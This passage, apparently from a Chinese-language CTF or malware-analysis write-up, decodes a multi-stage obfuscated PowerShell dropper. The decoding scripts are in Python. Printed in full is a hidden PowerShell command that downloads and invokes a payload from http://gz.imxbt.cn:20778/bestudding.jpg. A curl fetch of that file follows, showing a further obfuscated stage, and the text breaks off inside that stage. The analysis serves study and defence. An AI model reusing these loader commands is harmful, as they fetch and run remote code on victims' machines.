<span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">699</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">703</span>, <span class="hljs-number">656</span>, <span class="hljs-number">658</span>, <span class="hljs-number">703</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">657</span>, <span class="hljs-number">701</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">699</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">657</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">651</span>, <span class="hljs-number">699</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">652</span>, <span class="hljs-number">698</span>, <span class="hljs-number">656</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">653</span>, <span class="hljs-number">702</span>, <span class="hljs-number">653</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">703</span>, <span class="hljs-number">703</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">702</span>, <span class="hljs-number">650</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">702</span>, <span class="hljs-number">703</span>, <span class="hljs-number">656</span>, <span class="hljs-number">640</span>, <span class="hljs-number">645</span>, <span class="hljs-number">640</span>, <span class="hljs-number">647</span>, <span class="hljs-number">724</span>, <span class="hljs-number">651</span>, <span class="hljs-number">726</span>, <span class="hljs-number">640</span>, <span class="hljs-number">642</span>, <span class="hljs-number">633</span>, <span class="hljs-number">725</span>, <span class="hljs-number">633</span>, <span class="hljs-number">638</span>, <span class="hljs-number">633</span>, <span class="hljs-number">724</span>, <span class="hljs-number">633</span>, <span class="hljs-number">692</span>, <span class="hljs-number">700</span>, <span class="hljs-number">705</span>, <span class="hljs-number">698</span>, <span class="hljs-number">715</span>, <span class="hljs-number">694</span>, <span class="hljs-number">641</span>, <span class="hljs-number">692</span>, <span class="hljs-number">668</span>, <span class="hljs-number">712</span>, <span class="hljs-number">711</span>, <span class="hljs-number">719</span>, <span class="hljs-number">702</span>, <span class="hljs-number">715</span>, <span class="hljs-number">717</span>, <span class="hljs-number">694</span>, <span class="hljs-number">659</span>, <span class="hljs-number">659</span>, <span class="hljs-number">685</span>, <span class="hljs-number">712</span>, <span class="hljs-number">667</span>, <span class="hljs-number">722</span>, <span class="hljs-number">717</span>, <span class="hljs-number">702</span>, <span class="hljs-number">641</span>, <span class="hljs-number">637</span>, <span class="hljs-number">696</span>, <span class="hljs-number">647</span>, <span class="hljs-number">687</span>, <span class="hljs-number">698</span>, <span class="hljs-number">709</span>, <span class="hljs-number">718</span>, <span class="hljs-number">702</span>, <span class="hljs-number">645</span>, <span class="hljs-number">650</span>, <span class="hljs-number">655</span>, <span class="hljs-number">642</span>, <span class="hljs-number">633</span>, <span class="hljs-number">646</span>, <span class="hljs-number">699</span>, <span class="hljs-number">721</span>, <span class="hljs-number">712</span>, <span class="hljs-number">715</span>, <span class="hljs-number">633</span>, <span class="hljs-number">640</span>, <span class="hljs-number">651</span>, <span class="hljs-number">649</span>, <span class="hljs-number">653</span>, <span class="hljs-number">640</span>, <span class="hljs-number">642</span>, <span class="hljs-number">633</span>, <span class="hljs-number">726</span>, <span class="hljs-number">642</span>, <span class="hljs-number">633</span>, <span class="hljs-number">646</span>, <span class="hljs-number">707</span>, <span class="hljs-number">712</span>, <span class="hljs-number">706</span>, <span class="hljs-number">711</span>, <span class="hljs-number">633</span>, <span class="hljs-number">640</span>, <span class="hljs-number">640</span>, <span class="hljs-number">660</span>, <span class="hljs-number">639</span>, <span class="hljs-number">633</span>, <span class="hljs-number">637</span>, <span class="hljs-number">670</span>, <span class="hljs-number">671</span>, <span class="hljs-number">685</span>, <span class="hljs-number">670</span>, <span class="hljs-number">647</span>, <span class="hljs-number">684</span>, <span class="hljs-number">718</span>, <span class="hljs-number">699</span>, <span class="hljs-number">716</span>, <span class="hljs-number">717</span>, <span class="hljs-number">715</span>, <span class="hljs-number">706</span>, <span class="hljs-number">711</span>, <span class="hljs-number">704</span>, <span class="hljs-number">641</span>, <span class="hljs-number">649</span>, <span class="hljs-number">645</span>, <span class="hljs-number">652</span>, <span class="hljs-number">642</span>, <span class="hljs-number">633</span>, <span class="hljs-number">637</span>, <span class="hljs-number">670</span>, <span class="hljs-number">671</span>, <span class="hljs-number">685</span>, <span class="hljs-number">670</span>, <span class="hljs-number">647</span>, <span class="hljs-number">684</span>, <span class="hljs-number">718</span>, <span class="hljs-number">699</span>, <span class="hljs-number">716</span>, <span class="hljs-number">717</span>, <span class="hljs-number">715</span>, <span class="hljs-number">706</span>, <span class="hljs-number">711</span>, <span class="hljs-number">704</span>, <span class="hljs-number">641</span>, <span class="hljs-number">652</span>, <span class="hljs-number">642</span>] <br>emGK_data  = [<span class="hljs-number">688</span>,<span class="hljs-number">684</span>,<span class="hljs-number">700</span>,<span class="hljs-number">715</span>,<span class="hljs-number">706</span>,<span class="hljs-number">713</span>,<span class="hljs-number">717</span>,<span class="hljs-number">647</span>,<span class="hljs-number">684</span>,<span class="hljs-number">705</span>,<span class="hljs-number">702</span>,<span class="hljs-number">709</span>,<span class="hljs-number">709</span>]<br><br>ohyLbg = decode(ohyLbg_data)<br>emGK   = decode(emGK_data)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[emGK 解码结果]:&quot;</span>)<br><span class="hljs-built_in">print</span>(emGK)<br><span class="hljs-built_in">print</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[ohyLbg 解码结果]:&quot;</span>)<br><span class="hljs-built_in">print</span>(ohyLbg)<br></code></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[emGK 解码结果]:<br><span class="hljs-title class_">WScript</span>.<span class="hljs-title class_">Shell</span><br><br>[ohyLbg 解码结果]:<br>powershell.exe -w <span class="hljs-number">1</span> -ep <span class="hljs-title class_">Unrestricted</span> -nop <span class="hljs-variable">$EFTE</span> =([regex]::<span class="hljs-title class_">Matches</span>(<span class="hljs-string">&#x27;a5a9b49fb8adbeb8e19cbea3afa9bfbfeceee8a9a2baf69fb5bfb8a9a19ea3a3b8909fb5bf9b839bfaf8909ba5a2a8a3bbbf9ca3bba9be9fa4a9a0a090bafde2fc90bca3bba9bebfa4a9a0a0e2a9b4a9eeece19ba5a2a8a3bb9fb8b5a0a9ec84a5a8a8a9a2ece18dbeabb9a1a9a2b880a5bfb8ecebe1bbebe0eba4ebe0ebe1a9bcebe0eb99a2bea9bfb8bea5afb8a9a8ebe0ebe18fa3a1a1ada2a8ebe0ee9fa9b8e19aadbea5adaea0a9ecffeceba4b8b8bcf6e3e3abb6e2a5a1b4aeb8e2afa2f6fefcfbfbf4e3aea9bfb8b9a8a8a5a2abe2a6bcabebf79f85ec9aadbea5adaea0a9f6e396f888eceb82a9b8e29ba9ae8fa0a5a9a2b8ebf7afa8f79f9aecaff884ece4e2ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9beb09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6a882ada1a9ebb1e5e282ada1a9e5e285a2baa3a7a9e4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f888e5e29aada0b9a9e5f79f9aec8dece4e4e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5b08ba9b8e181a9a1aea9bee597fe91e282ada1a9e5e285a2baa3a7a9e4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f888e5e29aada0b9a9e5f79f9aec8de5e29aada0b9a9e5e285a2baa3a7a9e4e49aadbea5adaea0a9ecffece19aada0e5e5e5e5eef7&#x27;</span>,<span class="hljs-string">&#x27;.&#123;2&#125;&#x27;</span>) | % &#123; [char]([<span class="hljs-title class_">Convert</span>]::<span class="hljs-title class_">ToByte</span>(<span class="hljs-variable">$_</span>.<span class="hljs-title class_">Value</span>,<span class="hljs-number">16</span>) -bxor <span class="hljs-string">&#x27;204&#x27;</span>) &#125;) -join <span class="hljs-string">&#x27;&#x27;</span>;&amp; <span class="hljs-variable">$EFTE</span>.<span class="hljs-title class_">Substring</span>(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>) <span class="hljs-variable">$EFTE</span>.<span class="hljs-title class_">Substring</span>(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p>主要逻辑是把一串十六进制字符串：’a5a9b49f…’按 2 个字符分割：.{2} → a5, a9, b4,9f … 转成字节并异或 204,然后拼接成字符串：（也下一层的真实 payload），运行 $EFTE</p><p>解密脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> re<br><br>hex_string = <span class="hljs-string">&quot;a5a9b49fb8adbeb8e19cbea3afa9bfbfeceee8a9a2baf69fb5bfb8a9a19ea3a3b8909fb5bf9b839bfaf8909ba5a2a8a3bbbf9ca3bba9be9fa4a9a0a090bafde2fc90bca3bba9bebfa4a9a0a0e2a9b4a9eeece19ba5a2a8a3bb9fb8b5a0a9ec84a5a8a8a9a2ece18dbeabb9a1a9a2b880a5bfb8ecebe1bbebe0eba4ebe0ebe1a9bcebe0eb99a2bea9bfb8bea5afb8a9a8ebe0ebe18fa3a1a1ada2a8ebe0ee9fa9b8e19aadbea5adaea0a9ecffeceba4b8b8bcf6e3e3abb6e2a5a1b4aeb8e2afa2f6fefcfbfbf4e3aea9bfb8b9a8a8a5a2abe2a6bcabebf79f85ec9aadbea5adaea0a9f6e396f888eceb82a9b8e29ba9ae8fa0a5a9a2b8ebf7afa8f79f9aecaff884ece4e2ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9beb09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6a882ada1a9ebb1e5e282ada1a9e5e285a2baa3a7a9e4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f888e5e29aada0b9a9e5f79f9aec8dece4e4e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5b08ba9b8e181a9a1aea9bee597fe91e282ada1a9e5e285a2baa3a7a9e4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f888e5e29aada0b9a9e5f79f9aec8de5e29aada0b9a9e5e285a2baa3a7a9e4e49aadbea5adaea0a9ecffece19aada0e5e5e5e5eef7&quot;</span>  <br>xor_key = <span class="hljs-number">204</span><br><br>bytes_arr = re.findall(<span class="hljs-string">r&quot;.&#123;2&#125;&quot;</span>, hex_string)<br>decoded = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(b, <span class="hljs-number">16</span>) ^ xor_key) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bytes_arr)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[EFTE 解码结果]:&quot;</span>)<br><span class="hljs-built_in">print</span>(decoded)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[命令前3字符]:&quot;</span>, decoded[:<span class="hljs-number">3</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[命令参数]    :&quot;</span>, decoded[<span class="hljs-number">3</span>:])<br></code></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-type">EFTE</span> 解码结果]:<br><span class="hljs-built_in">iex</span><span class="hljs-built_in">Start-Process</span> <span class="hljs-string">&quot;<span class="hljs-variable">$env:SystemRoot</span>\SysWOW64\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span> <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&#x27;-w&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;-ep&#x27;</span>,<span class="hljs-string">&#x27;Unrestricted&#x27;</span>,<span class="hljs-string">&#x27;-Command&#x27;</span>,<span class="hljs-string">&quot;Set-Variable 3 &#x27;http://gz.imxbt.cn:20778/bestudding.jpg&#x27;;SI Variable:/Z4D &#x27;Net.WebClient&#x27;;cd;SV c4H (.`$ExecutionContext.InvokeCommand|Get-Member|Where&#123;(GV _).Value.Name-clike&#x27;*dName&#x27;&#125;).Name).Invoke(&#x27;Ne*ct&#x27;,1,1))(LS Variable:/Z4D).Value);SV A ((((Get-Variable c4H -ValueO)|Get-Member)[2].Name).Invoke(&#x27;Ne*ct&#x27;,1,1))(LS Variable:/Z4D).Value);SV A).Value).Invoke((Variable 3 -Val))))&quot;</span>;<br><br>[命令前<span class="hljs-number">3</span>字符]: <span class="hljs-built_in">iex</span><br>[命令参数]    : <span class="hljs-built_in">Start-Process</span> <span class="hljs-string">&quot;<span class="hljs-variable">$env:SystemRoot</span>\SysWOW64\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span> <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&#x27;-w&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;-ep&#x27;</span>,<span class="hljs-string">&#x27;Unrestricted&#x27;</span>,<span class="hljs-string">&#x27;-Command&#x27;</span>,<span class="hljs-string">&quot;Set-Variable 3 &#x27;http://gz.imxbt.cn:20778/bestudding.jpg&#x27;;SI Variable:/Z4D &#x27;Net.WebClient&#x27;;cd;SV c4H (.`$ExecutionContext.InvokeCommand|Get-Member|Where&#123;(GV _).Value.Name-clike&#x27;*dName&#x27;&#125;).Name).Invoke(&#x27;Ne*ct&#x27;,1,1))(LS Variable:/Z4D).Value);SV A ((((Get-Variable c4H -ValueO)|Get-Member)[2].Name).Invoke(&#x27;Ne*ct&#x27;,1,1))(LS Variable:/Z4D).Value);SV A).Value).Invoke((Variable 3 -Val))))&quot;</span>;<br></code></pre></td></tr></table></figure><p>获取图片中的内容<br><code>curl http://gz.imxbt.cn:20778/bestudding.jpg</code><br>得到如下内容</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">(<span class="hljs-string">&#x27;(&#x27;</span>  | % &#123; <span class="hljs-variable">$r</span> = + <span class="hljs-variable">$</span>() &#125; &#123; <span class="hljs-variable">$u</span> = <span class="hljs-variable">$r</span> &#125; &#123; <span class="hljs-variable">$b</span> = ++  <span class="hljs-variable">$r</span> &#125; &#123; <span class="hljs-variable">$q</span> = (  <span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span>  ) &#125; &#123; <span class="hljs-variable">$z</span> = (  <span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span>  ) &#125; &#123; <span class="hljs-variable">$o</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span>  ) &#125; &#123; <span class="hljs-variable">$d</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span>  ) &#125; &#123; <span class="hljs-variable">$h</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span>  ) &#125; &#123; <span class="hljs-variable">$e</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span>  ) &#125; &#123; <span class="hljs-variable">$i</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span>  ) &#125; &#123; <span class="hljs-variable">$x</span> = (<span class="hljs-variable">$q</span> *( <span class="hljs-variable">$z</span>) ) &#125; &#123; <span class="hljs-variable">$l</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span>) &#125; &#123; <span class="hljs-variable">$g</span> = <span class="hljs-string">&quot;[&quot;</span> + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123;  &#125;)&quot;</span>[<span class="hljs-variable">$e</span>  ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123;  &#125;)&quot;</span>[  <span class="hljs-string">&quot;<span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>&quot;</span>  ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123;  &#125;  )  &quot;</span>[  <span class="hljs-string">&quot;<span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>&quot;</span>  ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>?&quot;</span>[<span class="hljs-variable">$b</span>  ] + <span class="hljs-string">&quot;]&quot;</span> &#125; &#123; <span class="hljs-variable">$r</span> = <span class="hljs-string">&quot;&quot;</span>.(<span class="hljs-string">&quot;<span class="hljs-variable">$</span>(  @&#123;&#125;  )  &quot;</span>[  <span class="hljs-string">&quot;<span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>&quot;</span>  ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123;&#125;)  &quot;</span>[  <span class="hljs-string">&quot;<span class="hljs-variable">$b</span><span class="hljs-variable">$h</span>&quot;</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(  @&#123;  &#125;  )&quot;</span>[<span class="hljs-variable">$u</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123;&#125;  )&quot;</span>[<span class="hljs-variable">$o</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>?  &quot;</span>[  <span class="hljs-variable">$b</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(  @&#123;&#125;)&quot;</span>[<span class="hljs-variable">$z</span>  ]) &#125; &#123; <span class="hljs-variable">$r</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123;  &#125;  )&quot;</span>[  <span class="hljs-string">&quot;<span class="hljs-variable">$b</span>&quot;</span> + <span class="hljs-string">&quot;<span class="hljs-variable">$o</span>&quot;</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123;  &#125;)  &quot;</span>[<span class="hljs-variable">$o</span>  ] + <span class="hljs-string">&quot;<span class="hljs-variable">$r</span>&quot;</span>[<span class="hljs-string">&quot;<span class="hljs-variable">$q</span>&quot;</span> + <span class="hljs-string">&quot;<span class="hljs-variable">$e</span>&quot;</span>  ] &#125;  )  ;  <span class="hljs-string">&quot; <span class="hljs-variable">$r</span>  (<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span 